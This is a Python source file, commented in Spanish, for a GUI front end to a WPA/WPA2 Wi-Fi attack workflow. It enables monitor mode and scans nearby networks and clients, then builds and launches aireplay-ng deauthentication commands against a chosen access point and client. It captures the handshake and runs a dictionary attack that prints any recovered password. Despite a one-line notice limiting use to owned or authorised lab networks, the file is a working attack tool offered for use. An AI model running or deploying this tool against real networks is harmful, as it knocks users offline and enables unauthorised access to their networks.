"""Interfaz gráfica (CustomTkinter) para la auditoría WPA/WPA2.

Esta GUI NO reimplementa la lógica: solo importa y llama a los módulos del
backend ya probados (monitor_mode, escaneo, ataque, handshake, cracking).
La orquestación de captura y el archivado se hacen aquí para poder correr en
hilos (sin congelar la ventana) y guardar en la carpeta que elija el usuario.

Requiere: Kali Linux, suite aircrack-ng, privilegios root y 'customtkinter'.
    sudo python3 gui.py
"""
from __future__ import annotations

import os
import queue
import shlex
import shutil
import subprocess
import tempfile
import threading
import time
from datetime import datetime
from pathlib import Path

import customtkinter as ctk
from tkinter import filedialog, messagebox

# --- Backend ya probado (no se modifica; solo se usa) ---
from monitor_mode import listar_interfaces_wifi, iniciar_modo_monitor
from escaneo import escanear_redes
from ataque import (
    iniciar_captura_dirigida,
    detener_captura,
    ruta_captura,
    diagnosticar_pcap,
)
from handshake import confirmar_handshake
from cracking import crackear

# Mismos valores que usa main.py (prefijo y sufijos de los archivos de captura).
PREFIJO = "auditoria_tmp"
SUFIJOS = (
    ".cap", ".csv", ".kismet.csv", ".kismet.netxml",
    ".log.csv", ".airodump.log", "-airodump.log",
)
BASE = Path(__file__).resolve().parent

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


class AppAuditoria(ctk.CTk):
    def __init__(self) -> None:
        super().__init__()
        self.title("Auditoría WPA/WPA2")
        self.geometry("920x760")
        self.minsize(820, 640)

        # Estado de la sesión.
        self.cola: queue.Queue = queue.Queue()
        self.interfaces: list[dict] = []
        self.interfaz_monitor: str | None = None
        self.redes: list[dict] = []
        self.estaciones: list[dict] = []
        self.red_sel = ctk.IntVar(value=-1)
        self.est_sel = ctk.StringVar(value="")
        self.carpeta_capturas: str = str(BASE / "capturas")
        self.diccionario: str = ""
        self._ocupado = False
        self._botones_accion: list[ctk.CTkButton] = []

        self._construir_ui()
        self.after(100, self._procesar_cola)
        if getattr(os, "geteuid", lambda: 0)() != 0:
            self._log("[AVISO] No estás como root. Lanza con 'sudo python3 gui.py' "
                      "o las operaciones de captura fallarán.")

    # ------------------------------------------------------------------ UI
    def _construir_ui(self) -> None:
        contenedor = ctk.CTkScrollableFrame(self)
        contenedor.pack(fill="both", expand=True, padx=14, pady=14)

        ctk.CTkLabel(
            contenedor, text="Auditoría WPA/WPA2",
            font=ctk.CTkFont(size=24, weight="bold"),
        ).pack(anchor="w", pady=(0, 2))
        ctk.CTkLabel(
            contenedor,
            text="Uso exclusivo en redes propias o con autorización (laboratorio).",
            text_color="gray70",
        ).pack(anchor="w", pady=(0, 10))

        # --- 1. Interfaz / antena ---
        tarjeta1 = self._tarjeta(contenedor, "1 · Antena y modo monitor")
        fila1 = ctk.CTkFrame(tarjeta1, fg_color="transparent")
        fila1.pack(fill="x", pady=4)
        self.menu_interfaz = ctk.CTkOptionMenu(fila1, values=["(detecta primero)"], width=220)
        self.menu_interfaz.pack(side="left", padx=(0, 8))
        self._boton(fila1, "Detectar antenas", self._detectar_interfaces).pack(side="left", padx=4)
        self._boton(fila1, "Activar modo monitor", self._activar_monitor).pack(side="left", padx=4)
        self.lbl_monitor = ctk.CTkLabel(tarjeta1, text="Estado: sin configurar", text_color="gray70")
        self.lbl_monitor.pack(anchor="w", pady=(4, 0))

        # --- 2. Escaneo de redes ---
        tarjeta2 = self._tarjeta(contenedor, "2 · Escanear redes")
        fila2 = ctk.CTkFrame(tarjeta2, fg_color="transparent")
        fila2.pack(fill="x", pady=4)
        ctk.CTkLabel(fila2, text="Duración (s):").pack(side="left", padx=(0, 6))
        self.entry_dur_escaneo = ctk.CTkEntry(fila2, width=70)
        self.entry_dur_escaneo.insert(0, "20")
        self.entry_dur_escaneo.pack(side="left", padx=(0, 8))
        self._boton(fila2, "Escanear redes", self._escanear).pack(side="left", padx=4)

        ctk.CTkLabel(tarjeta2, text="Redes detectadas (elige una):").pack(anchor="w", pady=(6, 2))
        self.frame_redes = ctk.CTkScrollableFrame(tarjeta2, height=170)
        self.frame_redes.pack(fill="x", pady=(0, 6))

        ctk.CTkLabel(tarjeta2, text="Estaciones conectadas (opcional, para el deauth):").pack(anchor="w", pady=(6, 2))
        self.frame_estaciones = ctk.CTkScrollableFrame(tarjeta2, height=120)
        self.frame_estaciones.pack(fill="x")

        # --- 3. Configuración ---
        tarjeta3 = self._tarjeta(contenedor, "3 · Carpeta y diccionario")
        fila3a = ctk.CTkFrame(tarjeta3, fg_color="transparent")
        fila3a.pack(fill="x", pady=4)
        self._boton(fila3a, "Carpeta de capturas", self._elegir_carpeta).pack(side="left", padx=(0, 8))
        self.lbl_carpeta = ctk.CTkLabel(fila3a, text=self.carpeta_capturas, text_color="gray70")
        self.lbl_carpeta.pack(side="left")
        fila3b = ctk.CTkFrame(tarjeta3, fg_color="transparent")
        fila3b.pack(fill="x", pady=4)
        self._boton(fila3b, "Diccionario (.txt)", self._elegir_diccionario).pack(side="left", padx=(0, 8))
        self.lbl_diccionario = ctk.CTkLabel(fila3b, text="Ninguno seleccionado", text_color="gray70")
        self.lbl_diccionario.pack(side="left")

        # --- 4. Ataque ---
        tarjeta4 = self._tarjeta(contenedor, "4 · Captura del handshake")
        ctk.CTkLabel(
            tarjeta4,
            text="Cuando empiece la captura, ejecuta este comando en OTRA terminal "
                 "para forzar el handshake:",
            text_color="gray70", wraplength=840, justify="left",
        ).pack(anchor="w", pady=(0, 4))
        self.txt_aireplay = ctk.CTkTextbox(tarjeta4, height=48, wrap="word")
        self.txt_aireplay.pack(fill="x")
        self.txt_aireplay.insert("1.0", "Selecciona una red (y una estación) para ver el comando.")
        self.txt_aireplay.configure(state="disabled")
        fila4 = ctk.CTkFrame(tarjeta4, fg_color="transparent")
        fila4.pack(fill="x", pady=6)
        self._boton(fila4, "Copiar comando", self._copiar_aireplay).pack(side="left", padx=(0, 8))
        # Botón sin pasar por _boton: debe seguir ACTIVO durante la captura.
        self.btn_deauth = ctk.CTkButton(fila4, text="Lanzar deauth (terminal)",
                                        command=self._lanzar_deauth)
        self.btn_deauth.pack(side="left", padx=(0, 8))
        ctk.CTkLabel(fila4, text="Captura (s):").pack(side="left", padx=(8, 6))
        self.entry_dur_captura = ctk.CTkEntry(fila4, width=70)
        self.entry_dur_captura.insert(0, "60")
        self.entry_dur_captura.pack(side="left", padx=(0, 8))
        self.btn_atacar = self._boton(fila4, "▶ Iniciar ataque", self._iniciar_ataque)
        self.btn_atacar.pack(side="left", padx=4)
        self.barra = ctk.CTkProgressBar(tarjeta4)
        self.barra.set(0)
        self.barra.pack(fill="x", pady=(6, 0))

        # --- 5. Resultado / informe ---
        tarjeta5 = self._tarjeta(contenedor, "5 · Informe y registro")
        self.txt_log = ctk.CTkTextbox(tarjeta5, height=200, wrap="word")
        self.txt_log.pack(fill="both", expand=True)

    def _tarjeta(self, padre, titulo: str) -> ctk.CTkFrame:
        marco = ctk.CTkFrame(padre)
        marco.pack(fill="x", pady=8)
        ctk.CTkLabel(marco, text=titulo, font=ctk.CTkFont(size=16, weight="bold")).pack(
            anchor="w", padx=12, pady=(10, 2))
        interior = ctk.CTkFrame(marco, fg_color="transparent")
        interior.pack(fill="x", padx=12, pady=(0, 10))
        return interior

    def _boton(self, padre, texto: str, comando) -> ctk.CTkButton:
        btn = ctk.CTkButton(padre, text=texto, command=comando)
        self._botones_accion.append(btn)
        return btn

    # ------------------------------------------------------------- utilidades
    def _log(self, texto: str) -> None:
        self.txt_log.insert("end", texto + "\n")
        self.txt_log.see("end")

    def _bloquear(self, bloquear: bool) -> None:
        self._ocupado = bloquear
        estado = "disabled" if bloquear else "normal"
        for btn in self._botones_accion:
            try:
                btn.configure(state=estado)
            except Exception:
                pass

    def _lanzar(self, objetivo, *args) -> None:
        """Corre una operación de backend en un hilo para no congelar la GUI."""
        if self._ocupado:
            return
        self._bloquear(True)
        threading.Thread(target=objetivo, args=args, daemon=True).start()

    # --------------------------------------------------------------- acciones
    def _detectar_interfaces(self) -> None:
        self._log("[INFO] Detectando interfaces inalámbricas...")
        self._lanzar(self._hilo_detectar)

    def _hilo_detectar(self) -> None:
        try:
            interfaces = listar_interfaces_wifi()
            self.cola.put(("interfaces", interfaces))
        except Exception as exc:  # noqa: BLE001 - se reporta a la GUI
            self.cola.put(("error", f"No se pudieron listar las interfaces: {exc}"))

    def _activar_monitor(self) -> None:
        nombre = self._nombre_interfaz_elegida()
        if not nombre or nombre.startswith("("):
            messagebox.showwarning("Antena", "Primero detecta y elige una antena.")
            return
        self._log(f"[INFO] Activando modo monitor en {nombre} (cierra procesos que interfieren)...")
        self._lanzar(self._hilo_monitor, nombre)

    def _hilo_monitor(self, nombre: str) -> None:
        try:
            activa = iniciar_modo_monitor(nombre)
            self.cola.put(("monitor_ok", activa))
        except Exception as exc:  # noqa: BLE001
            self.cola.put(("error", f"No se pudo activar el modo monitor: {exc}"))

    def _escanear(self) -> None:
        if not self.interfaz_monitor:
            messagebox.showwarning("Monitor", "Primero activa el modo monitor.")
            return
        try:
            dur = int(self.entry_dur_escaneo.get())
            if not 1 <= dur <= 3600:
                raise ValueError
        except ValueError:
            messagebox.showwarning("Duración", "La duración de escaneo debe ser un número entre 1 y 3600.")
            return
        self._log(f"[INFO] Escaneando redes durante {dur} s...")
        self._lanzar(self._hilo_escaneo, dur)

    def _hilo_escaneo(self, dur: int) -> None:
        try:
            redes, estaciones = escanear_redes(self.interfaz_monitor, dur)
            self.cola.put(("redes", (redes, estaciones)))
        except Exception as exc:  # noqa: BLE001
            self.cola.put(("error", f"Falló el escaneo: {exc}"))

    def _elegir_carpeta(self) -> None:
        carpeta = filedialog.askdirectory(title="Carpeta donde guardar las capturas")
        if carpeta:
            self.carpeta_capturas = carpeta
            self.lbl_carpeta.configure(text=carpeta)
            self._log(f"[INFO] Carpeta de capturas: {carpeta}")

    def _elegir_diccionario(self) -> None:
        archivo = filedialog.askopenfilename(
            title="Diccionario de contraseñas",
            filetypes=[("Diccionarios", "*.txt"), ("Todos", "*.*")],
        )
        if archivo:
            self.diccionario = archivo
            self.lbl_diccionario.configure(text=Path(archivo).name)
            self._log(f"[INFO] Diccionario: {archivo}")

    def _red_actual(self) -> dict | None:
        idx = self.red_sel.get()
        if 0 <= idx < len(self.redes):
            return self.redes[idx]
        return None

    def _actualizar_aireplay(self) -> None:
        red = self._red_actual()
        self.txt_aireplay.configure(state="normal")
        self.txt_aireplay.delete("1.0", "end")
        if not red:
            self.txt_aireplay.insert("1.0", "Selecciona una red (y una estación) para ver el comando.")
        else:
            iface = self.interfaz_monitor or "wlan0"
            cliente = self.est_sel.get()
            if cliente:
                cmd = (f"sudo aireplay-ng -0 10 --ignore-negative-one "
                       f"-a {red['bssid']} -c {cliente} {iface}")
            else:
                cmd = (f"sudo aireplay-ng -0 10 --ignore-negative-one "
                       f"-a {red['bssid']} {iface}")
            self.txt_aireplay.insert("1.0", cmd)
        self.txt_aireplay.configure(state="disabled")

    def _copiar_aireplay(self) -> None:
        texto = self.txt_aireplay.get("1.0", "end").strip()
        if texto and not texto.startswith("Selecciona"):
            self.clipboard_clear()
            self.clipboard_append(texto)
            self._log("[INFO] Comando aireplay copiado al portapapeles.")

    def _detectar_terminal(self) -> str | None:
        for term in ("qterminal", "x-terminal-emulator", "gnome-terminal",
                     "xfce4-terminal", "konsole", "mate-terminal",
                     "lxterminal", "xterm"):
            if shutil.which(term):
                return term
        return None

    def _argv_terminal(self, term: str, script: str) -> list[str]:
        # Cada emulador recibe el comando de forma distinta.
        if term in ("gnome-terminal", "mate-terminal"):
            return [term, "--", "bash", script]
        if term in ("qterminal", "lxterminal"):
            return [term, "-e", f"bash {shlex.quote(script)}"]
        if term == "xfce4-terminal":
            return [term, "-x", "bash", script]
        return [term, "-e", "bash", script]

    def _lanzar_deauth(self) -> None:
        red = self._red_actual()
        if not self.interfaz_monitor or not red:
            messagebox.showwarning("Deauth", "Primero activa el modo monitor y elige una red.")
            return
        cliente = self.est_sel.get()
        partes = ["aireplay-ng", "-0", "10", "--ignore-negative-one", "-a", red["bssid"]]
        if cliente:
            partes += ["-c", cliente]
        partes.append(self.interfaz_monitor)
        comando = " ".join(partes)
        if getattr(os, "geteuid", lambda: 0)() != 0:
            comando = "sudo " + comando
        term = self._detectar_terminal()
        if not term:
            messagebox.showerror(
                "Deauth",
                "No encontré un emulador de terminal (qterminal, gnome-terminal, "
                "xterm...). Usa el botón 'Copiar comando' y pégalo tú.")
            return
        guion = (
            "#!/bin/bash\n"
            f"cd {shlex.quote(str(BASE))}\n"
            "echo '>>> Enviando desautenticaciones. Pulsa Ctrl+C para detener.'\n"
            "echo\n"
            f"{comando}\n"
            "echo\n"
            "echo '>>> Deauth terminado. Puedes cerrar esta ventana.'\n"
            "exec bash\n"
        )
        try:
            fd, ruta = tempfile.mkstemp(prefix="deauth_", suffix=".sh")
            with os.fdopen(fd, "w") as archivo:
                archivo.write(guion)
            os.chmod(ruta, 0o755)
            subprocess.Popen(self._argv_terminal(term, ruta))
            self._log(f"[INFO] Deauth lanzado en una terminal nueva ({term}).")
            self._log("[INFO] Esa terminal queda abierta para que la revises y la cierres tú.")
        except Exception as exc:  # noqa: BLE001
            messagebox.showerror("Deauth", f"No se pudo lanzar la terminal: {exc}")

    def _on_red(self) -> None:
        # Al elegir una red, repoblar las estaciones de ese BSSID.
        self.est_sel.set("")
        red = self._red_actual()
        self._poblar_estaciones(red["bssid"] if red else None)
        self._actualizar_aireplay()

    def _iniciar_ataque(self) -> None:
        red = self._red_actual()
        if not self.interfaz_monitor:
            messagebox.showwarning("Monitor", "Primero activa el modo monitor.")
            return
        if not red:
            messagebox.showwarning("Red", "Selecciona una red objetivo.")
            return
        if "WPA" not in str(red.get("cifrado", "")).upper():
            messagebox.showwarning("Cifrado", "Selecciona una red WPA/WPA2.")
            return
        try:
            dur = int(self.entry_dur_captura.get())
            if not 1 <= dur <= 3600:
                raise ValueError
        except ValueError:
            messagebox.showwarning("Duración", "La duración de captura debe ser un número entre 1 y 3600.")
            return
        if not self.diccionario:
            seguir = messagebox.askyesno(
                "Sin diccionario",
                "No elegiste diccionario. Se capturará el handshake pero no se "
                "probarán contraseñas. ¿Continuar igual?")
            if not seguir:
                return
        self.barra.set(0)
        self._log(f"\n[INFO] === Iniciando ataque sobre {red.get('essid')} / {red['bssid']} ===")
        self._log("[INFO] Lanza el comando aireplay en otra terminal cuando veas 'Capturando...'.")
        self._lanzar(self._hilo_ataque, red["bssid"], str(red["canal"]), dur,
                     self.carpeta_capturas, self.diccionario)

    def _hilo_ataque(self, bssid: str, canal: str, duracion: int,
                     carpeta_destino: str, diccionario: str) -> None:
        tiempos = {"captura": 0.0, "analisis": 0.0}
        proceso = maestro = None
        try:
            proceso, maestro = iniciar_captura_dirigida(self.interfaz_monitor, bssid, canal, PREFIJO)
            ruta = Path(ruta_captura(PREFIJO))
            self.cola.put(("estado", "Capturando... (lanza el aireplay ahora en otra terminal)"))
            inicio = time.monotonic()
            while True:
                if proceso.poll() is not None:
                    raise RuntimeError("airodump-ng terminó inesperadamente durante la captura")
                t = time.monotonic() - inicio
                if t >= duracion:
                    break
                self.cola.put(("progreso", min(t / duracion, 0.99)))
                time.sleep(0.3)
            tiempos["captura"] = time.monotonic() - inicio
        except Exception as exc:  # noqa: BLE001
            if proceso is not None and maestro is not None:
                try:
                    detener_captura(proceso, maestro)
                except Exception:
                    pass
            self.cola.put(("error", f"Error en la captura: {exc}"))
            return
        else:
            try:
                detener_captura(proceso, maestro)
            except Exception:
                pass

        # Análisis offline (mismas funciones del backend).
        try:
            diagnostico = diagnosticar_pcap(str(ruta))
            if diagnostico.get("error") or diagnostico.get("truncado"):
                self._archivar(ruta.parent, carpeta_destino)
                self.cola.put(("resultado", {
                    "ok": False, "tiempos": tiempos, "diagnostico": diagnostico,
                    "confirmado": False, "resultado": None, "diccionario": diccionario,
                    "mensaje": "La captura no es válida (vacía o truncada). Reintenta.",
                }))
                return
            verif = confirmar_handshake(ruta, bssid)
            confirmado = bool(verif.get("confirmado"))
            resultado = None
            if confirmado and diccionario:
                self.cola.put(("estado", "Handshake OK. Probando el diccionario..."))
                ini = time.monotonic()
                resultado = crackear(str(ruta), bssid, diccionario)
                tiempos["analisis"] = time.monotonic() - ini
            carpeta = self._archivar(ruta.parent, carpeta_destino)
            self.cola.put(("resultado", {
                "ok": True, "tiempos": tiempos, "diagnostico": diagnostico,
                "confirmado": confirmado, "cantidad": verif.get("cantidad", 0),
                "resultado": resultado, "diccionario": diccionario,
                "carpeta": str(carpeta) if carpeta else None,
            }))
        except Exception as exc:  # noqa: BLE001
            self.cola.put(("error", f"Error en el análisis: {exc}"))

    def _archivar(self, origen_dir: Path, carpeta_destino: str):
        """Mueve los archivos de la captura a <carpeta_destino>/<fecha_hora>/.

        Misma idea que main.archivar_captura, pero hacia la carpeta elegida en
        la GUI. No borra nada ajeno: solo mueve los del prefijo reservado.
        """
        try:
            archivos = [a for a in Path(origen_dir).iterdir()
                        if a.is_file() and a.name.startswith(PREFIJO + "-")
                        and a.name.endswith(SUFIJOS)]
            if not archivos:
                return None
            marca = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            destino = Path(carpeta_destino) / marca
            destino.mkdir(parents=True, exist_ok=True)
            for a in archivos:
                a.rename(destino / a.name)
            return destino
        except Exception:  # noqa: BLE001 - el archivado nunca debe romper el flujo
            return None

    # --------------------------------------------------------- cola de hilos
    def _procesar_cola(self) -> None:
        try:
            while True:
                tipo, dato = self.cola.get_nowait()
                self._despachar(tipo, dato)
        except queue.Empty:
            pass
        self.after(100, self._procesar_cola)

    def _despachar(self, tipo: str, dato) -> None:
        if tipo == "estado":
            self._log(f"[INFO] {dato}")
        elif tipo == "error":
            self._log(f"[ERROR] {dato}")
            messagebox.showerror("Error", dato)
            self.barra.set(0)
            self._bloquear(False)
        elif tipo == "interfaces":
            self._set_interfaces(dato)
            self._bloquear(False)
        elif tipo == "monitor_ok":
            self.interfaz_monitor = dato
            self.lbl_monitor.configure(text=f"Estado: modo monitor en {dato}", text_color="#4ade80")
            self._log(f"[OK] Modo monitor activo en {dato}.")
            self._actualizar_aireplay()
            self._bloquear(False)
        elif tipo == "redes":
            self._set_redes(*dato)
            self._bloquear(False)
        elif tipo == "progreso":
            self.barra.set(dato)
        elif tipo == "resultado":
            self.barra.set(1.0)
            self._mostrar_informe(dato)
            self._bloquear(False)

    def _set_interfaces(self, interfaces: list[dict]) -> None:
        self.interfaces = interfaces
        if not interfaces:
            self.menu_interfaz.configure(values=["(ninguna detectada)"])
            self.menu_interfaz.set("(ninguna detectada)")
            self._log("[AVISO] No se detectaron interfaces inalámbricas. ¿Antena conectada?")
            return
        nombres = [f"{i['nombre']} ({i['tipo']})" for i in interfaces]
        self.menu_interfaz.configure(values=nombres)
        # Preferir una que ya esté en modo monitor.
        monitor = next((n for n, i in zip(nombres, interfaces) if i["tipo"] == "monitor"), None)
        self.menu_interfaz.set(monitor or nombres[0])
        self._log(f"[OK] {len(interfaces)} interfaz(es) detectada(s).")

    def _nombre_interfaz_elegida(self) -> str:
        etiqueta = self.menu_interfaz.get()
        return etiqueta.split(" ")[0] if etiqueta else ""

    def _set_redes(self, redes: list[dict], estaciones: list[dict]) -> None:
        self.redes = redes
        self.estaciones = estaciones
        self.red_sel.set(-1)
        self.est_sel.set("")
        for w in self.frame_redes.winfo_children():
            w.destroy()
        for w in self.frame_estaciones.winfo_children():
            w.destroy()
        if not redes:
            ctk.CTkLabel(self.frame_redes, text="No se detectaron redes utilizables.").pack(anchor="w")
            self._log("[AVISO] Escaneo sin redes utilizables.")
            return
        for idx, red in enumerate(redes):
            texto = (f"{red.get('essid') or '<SSID oculto>'}   ·   canal {red.get('canal')}"
                     f"   ·   {red.get('cifrado') or '?'}   ·   {red.get('bssid')}")
            ctk.CTkRadioButton(
                self.frame_redes, text=texto, variable=self.red_sel, value=idx,
                command=self._on_red,
            ).pack(anchor="w", pady=2)
        self._log(f"[OK] {len(redes)} redes y {len(estaciones)} estaciones detectadas.")

    def _poblar_estaciones(self, bssid: str | None) -> None:
        for w in self.frame_estaciones.winfo_children():
            w.destroy()
        if not bssid:
            return
        asociadas = [e for e in self.estaciones
                     if str(e.get("bssid_conectado", "")).upper() == bssid.upper()]
        if not asociadas:
            ctk.CTkLabel(self.frame_estaciones,
                         text="Sin estaciones asociadas (puedes usar el deauth broadcast).").pack(anchor="w")
            return
        ctk.CTkRadioButton(self.frame_estaciones, text="(ninguna / broadcast)",
                           variable=self.est_sel, value="",
                           command=self._actualizar_aireplay).pack(anchor="w", pady=2)
        for e in asociadas:
            mac = e.get("mac_cliente", "?")
            ctk.CTkRadioButton(self.frame_estaciones, text=mac, variable=self.est_sel, value=mac,
                               command=self._actualizar_aireplay).pack(anchor="w", pady=2)

    def _mostrar_informe(self, datos: dict) -> None:
        t = datos["tiempos"]
        diag = datos.get("diagnostico") or {}
        self._log("\n" + "=" * 52)
        self._log("INFORME DE LA SESIÓN WPA/WPA2")
        self._log("=" * 52)
        self._log(f"Captura:              {t.get('captura', 0):.1f} s")
        self._log(f"Análisis:             {t.get('analisis', 0):.1f} s")
        self._log(f"Tramas:               {diag.get('tramas')}")
        self._log(f"EAPOL:                {diag.get('eapol')}")
        self._log(f"PCAP truncado:        {'Sí' if diag.get('truncado') else 'No'}")
        if datos.get("mensaje"):
            self._log(f"Aviso:                {datos['mensaje']}")
        self._log(f"Handshake confirmado: {'Sí' if datos.get('confirmado') else 'No'}")
        if datos.get("confirmado"):
            self._log(f"Handshakes:           {datos.get('cantidad', 0)}")
        dic = datos.get("diccionario")
        self._log(f"Diccionario:          {Path(dic).name if dic else 'No utilizado'}")
        res = datos.get("resultado")
        if res is not None:
            self._log(f"Candidatas probadas:  {res.get('claves_probadas')}")
            self._log(f"Coincidencia:         {'Sí' if res.get('encontrada') else 'No'}")
            if res.get("encontrada") and res.get("contrasena"):
                self._log(f"CONTRASEÑA ENCONTRADA: {res['contrasena']}")
        else:
            self._log("Análisis de claves:   No ejecutado")
        if datos.get("carpeta"):
            self._log(f"Captura guardada en:  {datos['carpeta']}")
        self._log("=" * 52)
        if not datos.get("confirmado"):
            self._log("[INFO] No se confirmó handshake. Vuelve a lanzar el ataque (y el deauth).")


def main() -> None:
    app = AppAuditoria()
    app.mainloop()


if __name__ == "__main__":
    main()
